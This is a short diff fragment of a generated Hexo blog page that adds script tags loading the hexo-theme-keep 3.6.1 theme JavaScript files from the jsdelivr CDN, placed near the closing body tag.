+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
 
 
 
 
-  </div>
+
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+
 </body>
 </html>
